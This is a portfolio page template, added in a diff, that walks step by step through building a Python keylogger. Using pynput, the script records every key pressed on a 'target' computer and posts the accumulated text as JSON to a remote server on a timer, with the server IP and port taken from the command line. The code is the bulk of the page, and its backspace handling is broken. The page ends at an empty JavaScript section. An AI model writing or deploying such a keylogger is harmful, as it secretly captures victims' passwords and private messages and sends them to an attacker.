@@ -1,0 +1,320 @@
+{% extends "base.html" %} {% block title %}João Buschinelli - Projects{% endblock %}
+
+{% block content %}
+<h1 id="typing-effect" class="display-2 mb-4"></h1>
+<br>
+<h3>Description</h3>
+
+<p class="solution-text no-indent">
+    This is a simple keylogger project that combines JavaScript, Python and a remote server to track keyboard keys pressed on a computer. 
+    First we need to setup a remote server to print the keys pressed in the target pc. With the IP address of the server and the listening port,
+    I've programmed a Python script that dumps json payloads and send it through a POST request to the remote server. The payloads are created when 
+    the target press any key.
+</p>
+
+<h3>Building the Python script</h3>
+
+<p class="solution-text no-indent">
+    In this first script, we define a <code class="hljs language-python"><span class="hljs-title">text</span></code> variable that records the keys pressed that way. In order to listen to the 
+    key pressed, we need to use <code class="hljs language-python"><span class="hljs-keyword">pynput</span></code> library. This library lets us 
+    record keyboard keys pressed.
+</p>
+
+<p class="solution-text no-indent">
+    We start by defining some functions. The idea here is to create a function that will make the post request, then another function that concatenates
+    to our <code class="hljs language-python"><span class="hljs-title">text</span></code> the key pressed, given this key as input. We shall call these two functions as
+    <code class="hljs language-python"><span class="hljs-title _function">post_request</span></code> and <code class="hljs language-python"><span class="hljs-title _function">key_down</span></code>.
+    We also want to add a <code class="hljs language-python"><span class="hljs-title _function">main</span></code> function.
+</p>
+
+<p class="solution-text no-indent">
+    The first part of the code should look like this:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-python">
+            <span class="hljs-keyword">from</span> pynput <span class="hljs-keyword">import</span> keyboard
+            <span class="hljs-keyword">import</span> requests
+            <span class="hljs-keyword">import</span> json
+            <span class="hljs-keyword">import</span> threading
+            <span class="hljs-keyword">import</span> optparse   
+            
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">post_request</span>():
+                <span class="hljs-keyword">pass</span>
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">key_down</span>(key):
+                <span class="hljs-keyword">pass</span>
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">main</span>():
+                <span class="hljs-keyword">pass</span>
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    Now that everything is setup, we can start writing up some code. Let's edit the key_down function. In order to track the keys, we need
+    a string variable, which we shall call 'text'. This string is going to be concatenated everytime a key is pressed. Everytime this variable
+    is updated, we have to use it in our post_request function to send it to our remote server. Following this idea, we have to make it a global
+    variable. After that, we start concatenating this string using the keyboard class inside pynput package. We need to track every possible key then
+    concatenating it to our variable. To do so, we need several if and elif statements. Everytime a key is pressed, the global variable 'text' is going
+    to be updated. This is what the code looks like:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-python">
+            <span class="hljs-keyword">from</span> pynput <span class="hljs-keyword">import</span> keyboard
+            <span class="hljs-keyword">import</span> requests
+            <span class="hljs-keyword">import</span> json
+            <span class="hljs-keyword">import</span> threading
+            <span class="hljs-keyword">import</span> optparse   
+            
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">post_request</span>():
+                <span class="hljs-keyword">pass</span>
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">key_down</span>(key):
+                <span class="hljs-keyword">global</span> text
+
+                <span class="hljs-keyword">if</span> key == keyboard.Key.enter:
+                    text += <span class="hljs-string">"\n"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.tab:
+                    text += <span class="hljs-string">"\t"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.space:
+                    text += <span class="hljs-string">" "</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) > <span class="hljs-number">0</span>:
+                    text -= text[:<span class="hljs-number">-1</span>]
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) == <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.ctrl_l <span class="hljs-keyword">or</span> key == keyboard.Key.ctrl_r:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.shift:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.f5:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.cmd:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.esc:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">else</span>:
+                    text += <span class="hljs-title _function">str</span>(key).<span class="hljs-title _function">strip</span>(<span class="hljs-string">"'"</span>)
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">main</span>():
+                <span class="hljs-keyword">pass</span>   
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    Since our 'text' variable is globally defined, it can be accessed through all other functions we define, allowing our key_down function to be a "void" method (for those who are fond of C language).
+</p>
+
+<p class="solution-text no-indent">
+    Now that our 'text' variable is tracking several possible keys pressed, let's move to our main function. Here we want to use a listener that will fetch
+    each key pressed down and then call our post_request function (yet to be coded). The pynput package has a listener inside the keyboard class. We assign to
+    a 'on_press' parameter our key_down method, and then the listener will fetch each key pressed while the target is online. After calling the post_request function,
+    We then use the 'join' method of the listener to collect all events until the key is released. The main function should look like this:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-python">
+            <span class="hljs-keyword">from</span> pynput <span class="hljs-keyword">import</span> keyboard
+            <span class="hljs-keyword">import</span> requests
+            <span class="hljs-keyword">import</span> json
+            <span class="hljs-keyword">import</span> threading
+            <span class="hljs-keyword">import</span> optparse   
+            
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">post_request</span>():
+                <span class="hljs-keyword">pass</span>
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">key_down</span>(key):
+                <span class="hljs-keyword">global</span> text
+
+                <span class="hljs-keyword">if</span> key == keyboard.Key.enter:
+                    text += <span class="hljs-string">"\n"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.tab:
+                    text += <span class="hljs-string">"\t"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.space:
+                    text += <span class="hljs-string">" "</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) > <span class="hljs-number">0</span>:
+                    text -= text[:<span class="hljs-number">-1</span>]
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) == <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.ctrl_l <span class="hljs-keyword">or</span> key == keyboard.Key.ctrl_r:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.shift:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.f5:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.cmd:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.esc:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">else</span>:
+                    text += <span class="hljs-title _function">str</span>(key).<span class="hljs-title _function">strip</span>(<span class="hljs-string">"'"</span>)
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">main</span>():
+                <span class="hljs-keyword">with</span> keyboard.Listener(on_press=key_down) <span class="hljs-keyword">as</span> listener:
+                    <span class="hljs-title _function">post_request</span>()
+                    listener.<span class="hljs-title _function">join</span>() 
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    We only need to write the post_request function and add some options using optparse package afterwards. The post_request function is responsible for sending
+    our text variable to the remote server through a POST request. Since our server is going to be running at some IP and listening at some port, we shall define
+    two global variables: 'ip' and 'port'. We also want to define another global variable called 'interval' which is responsible to wait for a certain amount of seconds
+    before each request. Since our payload is better interpreted as json, we also need to add a header to these requests, with the 'Content-Type' being 'application/json'. Then,
+    we define a timer variable which is responsible to call our post_request function after 'interval' amount of seconds has passed. This looks like the following: 
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-python">
+            <span class="hljs-keyword">from</span> pynput <span class="hljs-keyword">import</span> keyboard
+            <span class="hljs-keyword">import</span> requests
+            <span class="hljs-keyword">import</span> json
+            <span class="hljs-keyword">import</span> threading
+            <span class="hljs-keyword">import</span> optparse   
+            
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">post_request</span>():
+                <span class="hljs-keyword">global</span> ip
+                <span class="hljs-keyword">global</span> port
+                <span class="hljs-keyword">global</span> interval
+
+                <span class="hljs-keyword">try</span>:
+                    payload = json.dumps({"keyboardData": text})
+                    r = requests.post(
+                        <span class="hljs-literal">f</span><span class="hljs-string">"https://{ip}:{port}"</span>, data=payload,
+                        headers={"Content-Type": "application/json"}
+                    )
+                    timer = threading.Timer(interval, post_request)
+                    timer.start()
+                <span class="hljs-keyword">except</span>:
+                    <span class="hljs-title _function">print</span>("[!] Request failed.")
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">key_down</span>(key):
+                <span class="hljs-keyword">global</span> text
+
+                <span class="hljs-keyword">if</span> key == keyboard.Key.enter:
+                    text += <span class="hljs-string">"\n"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.tab:
+                    text += <span class="hljs-string">"\t"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.space:
+                    text += <span class="hljs-string">" "</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) > <span class="hljs-number">0</span>:
+                    text -= text[:<span class="hljs-number">-1</span>]
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) == <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.ctrl_l <span class="hljs-keyword">or</span> key == keyboard.Key.ctrl_r:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.shift:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.f5:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.cmd:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.esc:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">else</span>:
+                    text += <span class="hljs-title _function">str</span>(key).<span class="hljs-title _function">strip</span>(<span class="hljs-string">"'"</span>)
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">main</span>():
+                <span class="hljs-keyword">with</span> keyboard.Listener(on_press=key_down) <span class="hljs-keyword">as</span> listener:
+                    <span class="hljs-title _function">post_request</span>()
+                    listener.<span class="hljs-title _function">join</span>() 
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    Now that everything is done, we just need to provide this script the ip and port of our remote server. Let's make it such that it is interactable with
+    the user by using optparse package. Wrapping everything up, we have the following script:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-python">
+            <span class="hljs-keyword">from</span> pynput <span class="hljs-keyword">import</span> keyboard
+            <span class="hljs-keyword">import</span> requests
+            <span class="hljs-keyword">import</span> json
+            <span class="hljs-keyword">import</span> threading
+            <span class="hljs-keyword">import</span> optparse   
+            
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">post_request</span>():
+                <span class="hljs-keyword">global</span> ip
+                <span class="hljs-keyword">global</span> port
+                <span class="hljs-keyword">global</span> interval
+
+                <span class="hljs-keyword">try</span>:
+                    payload = json.dumps({"keyboardData": text})
+                    r = requests.post(
+                        <span class="hljs-literal">f</span><span class="hljs-string">"https://{ip}:{port}"</span>, data=payload,
+                        headers={"Content-Type": "application/json"}
+                    )
+                    timer = threading.Timer(interval, post_request)
+                    timer.start()
+                <span class="hljs-keyword">except</span>:
+                    <span class="hljs-title _function">print</span>("[!] Request failed.")
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">key_down</span>(key):
+                <span class="hljs-keyword">global</span> text
+
+                <span class="hljs-keyword">if</span> key == keyboard.Key.enter:
+                    text += <span class="hljs-string">"\n"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.tab:
+                    text += <span class="hljs-string">"\t"</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.space:
+                    text += <span class="hljs-string">" "</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) > <span class="hljs-number">0</span>:
+                    text -= text[:<span class="hljs-number">-1</span>]
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.backspace <span class="hljs-keyword">and</span> <span class="hljs-title _function">len</span>(text) == <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.ctrl_l <span class="hljs-keyword">or</span> key == keyboard.Key.ctrl_r:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.shift:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.f5:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.cmd:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">elif</span> key == keyboard.Key.esc:
+                    <span class="hljs-keyword">pass</span>
+                <span class="hljs-keyword">else</span>:
+                    text += <span class="hljs-title _function">str</span>(key).<span class="hljs-title _function">strip</span>(<span class="hljs-string">"'"</span>)
+
+            <span class="hljs-keyword">def</span> <span class="hljs-title _function">main</span>():
+                <span class="hljs-keyword">with</span> keyboard.Listener(on_press=key_down) <span class="hljs-keyword">as</span> listener:
+                    <span class="hljs-title _function">post_request</span>()
+                    listener.<span class="hljs-title _function">join</span>() 
+
+            <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+                text = ""
+                parser = optparse.OptionParser(<span class="hljs-string">"Usage: program.py -i &lt;ip address&gt; -p &lt;port&gt;"</span>)
+                parser.add_option('-i', dest='ip', type='string', help='Set the remote server IP')
+                parser.add_option('-p', dest='port', type='string', help='Set the remote server port.')
+                parser.add_option('-t', dest='interval', type='string', help='Time interval between each thread. Default is 10 seconds.', default='10')
+                (options, args) = parser.parse_args()
+
+                ip = options.ip
+                port = options.port
+                interval = int(options.interval)
+
+                <span class="hljs-keyword">if</span> ip == None or port == None:
+                    print(parser.usage)
+                    exit(0)
+
+                <span class="hljs-title _function">main</span>()
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    And the script is done.
+</p>
+
+<h3>Writing the JavaScript code</h3>
+
+{% endblock %}
